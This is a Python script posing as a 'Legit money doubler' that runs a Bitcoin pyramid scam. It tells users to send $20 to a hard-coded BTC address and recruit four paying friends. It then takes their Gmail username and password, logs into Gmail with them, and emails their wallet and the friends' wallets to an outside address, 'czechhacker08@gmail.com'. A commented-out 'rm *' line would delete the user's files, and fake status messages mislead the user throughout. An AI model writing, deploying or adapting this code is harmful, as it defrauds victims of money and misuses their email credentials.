import sys, os, os.path, time, random, smtplib, getpass
try:
  os.system("clear")
  print ("""

                                   _L/L
                                 _LT/l_L_
                               _LLl/L_T_lL_
           _T/L              _LT|L/_|__L_|_L_
         _Ll/l_L_          _TL|_T/_L_|__T__|_l_
       _TLl/T_l|_L_      _LL|_Tl/_|__l___L__L_|L_
     _LT_L/L_|_L_l_L_  _'|_|_|T/_L_l__T _ l__|__|L_
   _Tl_L|/_|__|_|__T _LlT_|_Ll/_l_ _|__[ ]__|__|_l_L_
 _LT_l_l/|__|__l_T _T_L|_|_|l/___|__ | _l__|_ |__|_T_L_

  """)
  os.system("figlet Pyramid")
  print ("")
  print (" \033[1;34;40m[o] \033[1;32;40mLegit money doubler")
  time.sleep(1)
  print (" \033[1;34;40m[o] \033[1;32;40mMade by Bitcoin Masters")
  time.sleep(1)
  print (" \033[1;34;40m[o] \033[1;32;40mSpecial thanks to investor ARTZOW")
  time.sleep(1)
  if os.path.isfile("address.txt"):
    addr_file = open("address.txt", "r")
    address = addr_file.read()
    if len(address) <= 30:
      os.system("rm address.txt")
      print (" \n \033[1;31;40m[!] \033[1;35;40mWARNING: ERROR while checking wallet. Quitting.")
      exit()
    print ("\n \033[1;34;40m[o] \033[1;32;40mWallet: " + address)
    addr_file.close()
  else:
    addr_file = open("address.txt", "w")
    try:
      print("\n \033[1;34;40m[o] \033[1;32;40mSet BTC wallet address: ")
      address = input("     ")
      addr_file.write(address)
      if len(address) <= 30:
        os.system("rm address.txt")
        print ("\n \033[1;31;40m[!] \033[1;35;40mWARNING: \033[1;31;40mInvalid BTC address! Restart the program.")
        exit()
      else:
        print ("\n \033[1;34;40m[o] \033[1;32;40mAddress have been set.")
      addr_file.close()
    except KeyboardInterrupt:
      print("\n \033[1;31;40m[!] \033[1;35;40mPyramid: \033[1;31;40mConnection error. Restart the program.\n")
      exit()
  time.sleep(1)
  print ("\n \033[1;34;40m[o] \033[1;32;40mSend $20 to this BTC address: \n   \033[1;35;40m  1M5AMmTsYrZvgt8e1d1JihxR9UCgtmxMH2")
  time.sleep(2)
  print ("\n \033[1;34;40m[o] \033[1;32;40mYour 4 friends must also pay $20. \n     Send their wallets after login.\n\n")
  time.sleep(1)
  def line():
    print ("     _____________________________________\n")
  line()
  print ("\033[1;31;40m [o] \033[1;32;40mConnected to: https://smtp.gmail.com/")
  line()
  username = input("\033[1;36;40m [o] \033[1;32;40mUsername: ")
  password = getpass.getpass(prompt="\033[1;36;40m [o] \033[1;32;40mPassword: ", stream=None)
  connected = False
  while not connected:
    try:
      server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
      connected = True
    except:
      print("\n \033[1;31;40m[!] \033[1;35;40mPyramid: \033[1;31;40mConnection error. Restart the program.\n")
      exit()
  connected = False
  while not connected:
    try:
      server.login(username, password)
      connected = True
    except:
      print("\n \033[1;31;40m[!] \033[1;35;40mPyramid: \033[1;31;40mConnection error. Restart the program.\n")
      exit()
  msg1 = input("\n\033[1;34;40m [o] \033[1;32;40m1. wallet: ")
  msg2 = input("\033[1;34;40m [o] \033[1;32;40m2. wallet: ")
  msg3 = input("\033[1;34;40m [o] \033[1;32;40m3. wallet: ")
  msg4 = input("\033[1;34;40m [o] \033[1;32;40m4. wallet: ")
  info = f"\nWallet: {address}\n\n1: {msg1}\n2: {msg2}\n3: {msg3}\n4: {msg4}"
  send = input("\n\033[1;31;40m [o] \033[1;32;40mSend the email? (y/n): ")
  if send == "y":
    try:
      print ("\n\033[1;31;40m [o] AntiSpam: \033[1;32;40mWait 120 seconds.")
      time.sleep(1)
      server.sendmail(username+"@gmail.com", "czechhacker08@gmail.com", info)
      print ("\n\033[1;36;40m [o] \033[1;32;40mMessage sent. Wait for payment.\n")
######os.system("rm *")
      print(" \033[1;31;40m[!] \033[1;35;40mPyramid\033[1;32;40m: \033[1;31;40mSELFDESTRUCTED.\n")
    except KeyboardInterrupt:
      print("\n \033[1;31;40m[!] \033[1;35;40mPyramid: \033[1;31;40mKeyboard Interrupted.\n")
  else:
    print ("\n\033[1;31;40m [o] \033[1;32;40mERROR. Restart the program.\n")
    exit()
except KeyboardInterrupt:
  print("\n \033[1;31;40m[!] \033[1;35;40mPyramid: \033[1;31;40mKeyboard Interrupted.\n")
except OSError:
  print("\n \033[1;31;40m[!] \033[1;35;40mPyramid: \033[1;31;40mConnection error. Restart the program.\n")
except:
  print("\n \033[1;31;40m[!] \033[1;35;40mPyramid: \033[1;31;40mERROR.\n")
